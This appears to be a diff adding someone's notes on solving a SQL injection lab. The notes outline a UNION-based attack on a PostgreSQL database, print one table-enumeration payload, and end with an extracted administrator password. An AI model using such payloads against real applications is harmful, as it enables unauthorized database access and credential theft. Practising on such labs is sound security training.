@@ -1,0 +1,35 @@
+steps:
+
+1)find num of col
+2)find wwhat cols are str type
+3)find type of database (not oracle)
+4)find tables
+5)find the cols of table "users"
+6)use this info for union payload to get
+  usernames + passwwords
+
+  solution:
+
+  1) number of cols: 2
+
+  2)both cols are str
+
+  3)PostgreSQL 12.22 (Ubuntu 12.22-0ubuntu0.20.04.2) 
+  on x86_64-pc-linux-gnu,
+   compiled by gcc 
+   (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, 64-bit
+
+  4)table i suspect: users_ykuwmw
+
+   command to find the tables again: 
+   ' UNION SELECT table_name,NULL FROM information_schema.tables--
+
+  5)you did good! thats the table the cols are:
+
+  email
+  username_zzcssi
+  password_byaqon
+
+  6)
+  administrator
+  l61njrrp91vxwm4ury6d
